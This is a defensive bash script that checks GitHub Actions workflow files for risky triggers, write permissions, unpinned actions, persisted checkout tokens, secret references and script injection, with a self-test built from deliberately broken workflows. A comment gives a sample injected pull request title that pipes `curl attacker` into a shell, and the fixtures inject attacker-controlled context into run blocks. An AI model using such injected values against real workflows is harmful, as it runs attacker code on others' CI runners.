#!/usr/bin/env bash
# SPDX-License-Identifier: AGPL-3.0-only
#
# workflow-policy-check.sh — assert the security properties of the GitHub
# Actions workflows, mechanically, on every gate run.
#
# WHY THIS EXISTS
#
# The workflow's strongest security property — that an untrusted contribution
# cannot obtain a privileged token or a repository secret — was carried by
# HUMAN REVIEW (docs/VERIFICATION.md section 3.4). Review is not a gate: it
# happens when someone remembers, against whatever the file said that day, and
# it leaves no artifact that fails when the property is removed. Every one of
# these properties is a single-line edit away from being lost, and none of them
# would fail any existing test.
#
# WHAT THIS DOES AND DOES NOT ESTABLISH
#
# This is a LEXICAL checker. It reads the workflow files as text and asserts
# facts about what they say. It therefore establishes that the workflow, as
# written, declares the posture the requirement asks for.
#
# It does NOT establish what GitHub does at run time. That a `pull_request`
# event from a fork really is issued a read-only token, and really is denied
# repository secrets, is a fact about GitHub's implementation; observing it
# needs a pull request from a fork and a run log. That evidence gap is
# docs/VERIFICATION.md section 6.4 item 10 and is not closed by this program.
# What this program removes is the OTHER half of the risk: that the declaration
# itself is silently changed.
#
# It is also not a YAML parser. A deliberately obfuscated workflow — flow
# mappings, anchors, unusual quoting — could express a forbidden construct in a
# form these patterns do not match. The threat this addresses is an accidental
# or careless change by someone with commit access, not an adversary with
# commit access who is actively evading the checker; against the latter, no
# gate in this repository is load-bearing.
#
# Usage:
#   bash scripts/workflow-policy-check.sh              check the repository
#   bash scripts/workflow-policy-check.sh --self-test  prove the checks fire
#   bash scripts/workflow-policy-check.sh --dir DIR    check DIR instead
#
# Exit status: 0 when every workflow satisfies every property.

set -uo pipefail

FINDINGS=0
CHECKED=0

finding() { printf '\033[31m  VIOLATION\033[0m %s\n' "$1"; FINDINGS=$((FINDINGS + 1)); }
satisfied() { printf '\033[32m  ok       \033[0m %s\n' "$1"; }
note() { printf '             %s\n' "$1"; }

# strip_comments <file> — the file with full-line and trailing comments removed.
#
# Without this the checker reads its own prose. gates.yml explains why
# `pull_request_target` is forbidden, in a comment, using the word; a checker
# that grepped the raw file would report the explanation as the violation.
# Trailing comments are removed only after a space, so a `#` inside a quoted
# value is preserved.
strip_comments() {
  sed -e 's/[[:space:]]#[^"'"'"']*$//' -e 's/^[[:space:]]*#.*$//' -- "$1"
}

# --- The properties -----------------------------------------------------------

# P1. No privileged trigger. `pull_request_target` and `workflow_run` both run
# the BASE repository's workflow definition with a writable token and access to
# repository secrets. Combined with a checkout of the head ref they hand any
# contributor arbitrary code execution with those privileges.
check_no_privileged_trigger() {
  local f="$1" body="$2" hit
  hit="$(printf '%s\n' "$body" | grep -nE '^[[:space:]]*(pull_request_target|workflow_run)[[:space:]]*:' || true)"
  if [ -n "$hit" ]; then
    finding "$f declares a privileged trigger: $(printf '%s' "$hit" | tr '\n' ' ')"
    return 1
  fi
  satisfied "$f: no pull_request_target or workflow_run trigger"
}

# P2. A top-level permissions block exists. Its ABSENCE is the dangerous case:
# the job then inherits the repository's default, which may be read-write, and
# the workflow file gives no sign of it.
check_top_level_permissions() {
  local f="$1" body="$2"
  if printf '%s\n' "$body" | grep -qE '^permissions[[:space:]]*:'; then
    satisfied "$f: declares a top-level permissions block"
    return 0
  fi
  finding "$f has no top-level permissions block, so its token scope is whatever the repository default happens to be"
  return 1
}

# P3. Every permission granted anywhere is read or none. This walks each
# `permissions:` block and inspects the scopes indented under it, so a job-level
# block that widens what the top level narrowed is caught.
check_permissions_read_only() {
  local f="$1" body="$2" bad=""
  bad="$(printf '%s\n' "$body" | awk '
    # Depth of the permissions block currently open, or -1 for none.
    BEGIN { depth = -1 }
    {
      line = $0
      if (line ~ /^[[:space:]]*$/) next
      indent = match(line, /[^ ]/) - 1
      if (depth >= 0 && indent <= depth) depth = -1
      if (line ~ /^[[:space:]]*permissions[[:space:]]*:/) {
        value = line
        sub(/^[[:space:]]*permissions[[:space:]]*:[[:space:]]*/, "", value)
        if (value != "") {
          # Inline form: `permissions: read-all` / `permissions: write-all` / {}
          if (value !~ /^(read-all|\{\})$/) print NR ": permissions: " value
          depth = -1
        } else {
          depth = indent
        }
        next
      }
      if (depth >= 0 && indent > depth) {
        scope = line; val = line
        sub(/[[:space:]]*:.*$/, "", scope); sub(/^[[:space:]]*/, "", scope)
        sub(/^[^:]*:[[:space:]]*/, "", val)
        if (val != "read" && val != "none") print NR ": " scope ": " val
      }
    }')"
  if [ -n "$bad" ]; then
    finding "$f grants a permission that is neither read nor none: $(printf '%s' "$bad" | tr '\n' ';')"
    return 1
  fi
  satisfied "$f: every declared permission is read or none"
}

# P4. Every third-party action is pinned to a commit SHA. A tag is mutable: the
# action's owner, or anyone who compromises that account, can repoint it at
# different code, which then runs here with whatever this job has.
check_actions_pinned() {
  local f="$1" body="$2" bad=""
  bad="$(printf '%s\n' "$body" \
    | grep -E '^[[:space:]]*(-[[:space:]]*)?uses[[:space:]]*:' \
    | sed -E 's/^[[:space:]]*(-[[:space:]]*)?uses[[:space:]]*:[[:space:]]*//; s/[[:space:]]*$//; s/^["'"'"']//; s/["'"'"']$//' \
    | grep -vE '^\./' \
    | grep -vE '^[A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+@[0-9a-f]{40}$' || true)"
  if [ -n "$bad" ]; then
    finding "$f uses an action that is not pinned to a 40-character commit SHA: $(printf '%s' "$bad" | tr '\n' ';')"
    return 1
  fi
  satisfied "$f: every action reference is pinned to a commit SHA"
}

# P5. Checkout must not leave a credential in the work tree. `persist-credentials`
# defaults to TRUE: without an explicit false, actions/checkout writes the job's
# token into .git/config, where any later step — including one running code from
# a fork — can read it.
check_checkout_credentials() {
  local f="$1" body="$2" missing=0 total=0
  local -a starts=()
  mapfile -t starts < <(printf '%s\n' "$body" | grep -nE 'uses[[:space:]]*:[[:space:]]*["'"'"']?actions/checkout@' | cut -d: -f1)
  total=${#starts[@]}
  if [ "$total" -eq 0 ]; then
    satisfied "$f: does not check out the repository"
    return 0
  fi
  local s
  for s in "${starts[@]}"; do
    # The `with:` block belongs to the same step, so look only at the lines
    # between this `uses:` and the next step boundary.
    if ! printf '%s\n' "$body" | tail -n "+$s" | awk '
        NR == 1 { next }
        /^[[:space:]]*-[[:space:]]*(name|uses)[[:space:]]*:/ { exit }
        /persist-credentials[[:space:]]*:[[:space:]]*false/ { found = 1; exit }
        END { exit(found ? 0 : 1) }' ; then
      missing=$((missing + 1))
    fi
  done
  if [ "$missing" -gt 0 ]; then
    finding "$f checks out the repository without persist-credentials: false ($missing of $total checkout steps), leaving the job token in .git/config"
    return 1
  fi
  satisfied "$f: every checkout sets persist-credentials: false ($total step(s))"
}

# P6. No repository secret is referenced. This repository's stated posture is
# that the workflow needs none, and a workflow that references none has nothing
# for an untrusted contribution to exfiltrate — whatever GitHub's token policy
# turns out to be. GITHUB_TOKEN is exempt: it is not a repository secret, its
# scope is the permissions block above, and referencing it is how a workflow
# uses the scope it declared.
check_no_secret_references() {
  local f="$1" body="$2" bad=""
  bad="$(printf '%s\n' "$body" | grep -nE 'secrets\.[A-Za-z_]' | grep -vE 'secrets\.GITHUB_TOKEN' || true)"
  if [ -n "$bad" ]; then
    finding "$f references a repository secret: $(printf '%s' "$bad" | tr '\n' ';')"
    return 1
  fi
  satisfied "$f: references no repository secret"
}

# P7. No untrusted context is interpolated into a shell command. GitHub expands
# `${{ }}` textually BEFORE the shell sees the script, so a pull request whose
# title is `"; curl attacker | sh; #` executes on the runner. The values below
# are all attacker-chosen on a pull_request event.
UNTRUSTED_CONTEXTS='github\.event\.(issue|pull_request|comment|review|head_commit|commits|discussion)|github\.head_ref|github\.event\.inputs\.'
check_no_script_injection() {
  local f="$1" body="$2" bad=""
  bad="$(printf '%s\n' "$body" | awk -v pat="$UNTRUSTED_CONTEXTS" '
    # Track whether the current line is inside a run: block scalar.
    {
      line = $0
      if (line ~ /^[[:space:]]*$/) next
      indent = match(line, /[^ ]/) - 1
      if (inrun && indent <= rundepth) inrun = 0
      if (line ~ /^[[:space:]]*run[[:space:]]*:/) { inrun = 1; rundepth = indent }
      if (inrun && line ~ /\$\{\{/) {
        expr = line
        if (match(expr, pat)) print NR ": " line
      }
    }')"
  if [ -n "$bad" ]; then
    finding "$f interpolates attacker-controlled context into a shell command: $(printf '%s' "$bad" | tr '\n' ';')"
    return 1
  fi
  satisfied "$f: no attacker-controlled context reaches a run: block"
}

check_file() {
  local f="$1" body
  CHECKED=$((CHECKED + 1))
  body="$(strip_comments "$f")" || { finding "$f could not be read"; return 1; }
  printf '\n-- %s --\n' "$f"
  check_no_privileged_trigger  "$f" "$body"
  check_top_level_permissions  "$f" "$body"
  check_permissions_read_only  "$f" "$body"
  check_actions_pinned         "$f" "$body"
  check_checkout_credentials   "$f" "$body"
  check_no_secret_references   "$f" "$body"
  check_no_script_injection    "$f" "$body"
}

run_over_dir() {
  local dir="$1" f
  local -a files=()
  mapfile -t files < <(find "$dir" -maxdepth 1 -type f \( -name '*.yml' -o -name '*.yaml' \) | sort)
  if [ "${#files[@]}" -eq 0 ]; then
    printf 'workflow-policy: no workflow files found under %s\n' "$dir" >&2
    return 2
  fi
  for f in "${files[@]}"; do check_file "$f"; done
  return 0
}

# --- Self-test ----------------------------------------------------------------
#
# Each case is a workflow that is compliant except for ONE property, and the
# checker must reject exactly that one. A checker whose patterns never fire is
# indistinguishable from a clean repository, which is the failure mode these
# cases exist to make impossible.
self_test() {
  local tmp st_fail=0 st_total=0
  tmp="$(mktemp -d)" || return 2
  trap 'rm -rf "$tmp"' RETURN

  st() { # <label> <expect: pass|fail> <file> [pattern]
    local label="$1" expect="$2" file="$3" pattern="${4:-}"
    st_total=$((st_total + 1))
    # The verdict is counted from the captured OUTPUT, not from the FINDINGS
    # counter: a self-test that read the same global the checker writes would
    # agree with it by construction.
    local text count
    text="$( check_file "$file" 2>&1 )"
    count="$(printf '%s\n' "$text" | grep -c 'VIOLATION' || true)"
    if [ "$expect" = "pass" ]; then
      if [ "$count" -eq 0 ]; then printf '\033[32mok\033[0m   %s\n' "$label"
      else st_fail=$((st_fail + 1)); printf '\033[31mFAIL\033[0m %s (expected no violation, got %s)\n' "$label" "$count"; fi
      return 0
    fi
    if [ "$count" -eq 0 ]; then
      st_fail=$((st_fail + 1)); printf '\033[31mFAIL\033[0m %s (the defect was not detected)\n' "$label"
    elif [ -n "$pattern" ] && ! grep -qE "$pattern" <<<"$text"; then
      st_fail=$((st_fail + 1)); printf '\033[31mFAIL\033[0m %s (detected, but not reported as /%s/)\n' "$label" "$pattern"
    else
      printf '\033[32mok\033[0m   %s\n' "$label"
    fi
  }

  # The compliant baseline. Every negative case below is this file with one
  # property broken, so a case that fails is attributable to that property.
  cat > "$tmp/good.yml" <<'YAML'
name: good
# pull_request_target is deliberately named in this comment: the checker must
# read the file, not its prose.
on:
  push:
    branches: [main]
  pull_request:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09
        with:
          persist-credentials: false
      - name: Build
        run: |
          echo "commit ${{ github.sha }}"
YAML

  make_bad() { # <name> <sed program>
    sed -E "$2" "$tmp/good.yml" > "$tmp/$1.yml"
  }

  st "a compliant workflow is accepted" pass "$tmp/good.yml"

  make_bad trigger 's/^  pull_request:$/  pull_request_target:/'
  st "a pull_request_target trigger is rejected" fail "$tmp/trigger.yml" 'privileged trigger'

  make_bad workflowrun 's/^  pull_request:$/  workflow_run:\n    workflows: [other]/'
  st "a workflow_run trigger is rejected" fail "$tmp/workflowrun.yml" 'privileged trigger'

  grep -v '^permissions:$' "$tmp/good.yml" | grep -v '^  contents: read$' > "$tmp/noperm.yml"
  st "a missing top-level permissions block is rejected" fail "$tmp/noperm.yml" 'no top-level permissions block'

  make_bad writeperm 's/^      contents: read$/      contents: write/'
  st "a job-level write permission is rejected" fail "$tmp/writeperm.yml" 'neither read nor none'

  make_bad writeall 's/^permissions:$/permissions: write-all/; /^  contents: read$/d'
  st "permissions: write-all is rejected" fail "$tmp/writeall.yml" 'neither read nor none'

  make_bad tagpin 's|actions/checkout@[0-9a-f]{40}|actions/checkout@v5|'
  st "an action pinned to a tag is rejected" fail "$tmp/tagpin.yml" 'not pinned to a 40-character commit SHA'

  make_bad shortpin 's|actions/checkout@[0-9a-f]{40}|actions/checkout@fbc6f39|'
  st "an action pinned to a short SHA is rejected" fail "$tmp/shortpin.yml" 'not pinned to a 40-character commit SHA'

  make_bad creds 's/^          persist-credentials: false$/          fetch-depth: 0/'
  st "a checkout that keeps the token is rejected" fail "$tmp/creds.yml" 'persist-credentials'

  # shellcheck disable=SC2016  # '${{ }}' is GitHub expression syntax, kept literal
  make_bad secret 's|echo "commit \$\{\{ github.sha \}\}"|echo "${{ secrets.DEPLOY_KEY }}"|'
  st "a repository secret reference is rejected" fail "$tmp/secret.yml" 'references a repository secret'

  # shellcheck disable=SC2016  # '${{ }}' is GitHub expression syntax, kept literal
  make_bad token 's|echo "commit \$\{\{ github.sha \}\}"|echo "${{ secrets.GITHUB_TOKEN }}" > /dev/null|'
  st "GITHUB_TOKEN is not treated as a repository secret" pass "$tmp/token.yml"

  # shellcheck disable=SC2016  # '${{ }}' is GitHub expression syntax, kept literal
  make_bad inject 's|echo "commit \$\{\{ github.sha \}\}"|echo "${{ github.event.pull_request.title }}"|'
  st "an attacker-controlled title in a run block is rejected" fail "$tmp/inject.yml" 'attacker-controlled context'

  # shellcheck disable=SC2016  # '${{ }}' is GitHub expression syntax, kept literal
  make_bad injectref 's|echo "commit \$\{\{ github.sha \}\}"|echo "${{ github.head_ref }}"|'
  st "an attacker-controlled head ref in a run block is rejected" fail "$tmp/injectref.yml" 'attacker-controlled context'

  # The same expression OUTSIDE a run block is not shell injection: it is
  # interpolated into a YAML value, not into a command line. A checker that
  # rejected it would be reporting a false positive, and false positives are
  # how a gate gets disabled.
  # shellcheck disable=SC2016  # '${{ }}' is GitHub expression syntax, kept literal
  make_bad injectenv 's|^      - name: Build$|      - name: Build\n        env:\n          TITLE: ${{ github.event.pull_request.title }}|'
  st "the same value passed through env: is accepted" pass "$tmp/injectenv.yml"

  printf '\n%d self-test(s), %d failure(s)\n' "$st_total" "$st_fail"
  [ "$st_fail" -eq 0 ] || return 1
  return 0
}

# --- Entry point --------------------------------------------------------------
DIR=".github/workflows"
case "${1:-}" in
  --self-test)
    self_test
    exit $?
    ;;
  --dir)
    [ $# -ge 2 ] || { printf 'usage: %s --dir DIR\n' "$0" >&2; exit 2; }
    DIR="$2"
    ;;
  "") ;;
  *) printf 'usage: %s [--self-test|--dir DIR]\n' "$0" >&2; exit 2 ;;
esac

if [ ! -d "$DIR" ]; then
  printf 'workflow-policy: %s does not exist\n' "$DIR" >&2
  exit 2
fi

echo "workflow policy check: $DIR"
run_over_dir "$DIR" || exit 2

printf '\n%d workflow file(s) checked, %d violation(s)\n' "$CHECKED" "$FINDINGS"
if [ "$FINDINGS" -gt 0 ]; then
  echo "RESULT: the workflow declares a posture the requirement forbids."
  exit 1
fi
echo "RESULT: every workflow declares the required posture."
echo "NOTE: this is what the files SAY. That GitHub withholds secrets and issues"
echo "      a read-only token to a fork pull request is a fact about GitHub, and"
echo "      needs a run from a fork — docs/VERIFICATION.md section 6.4 item 10."
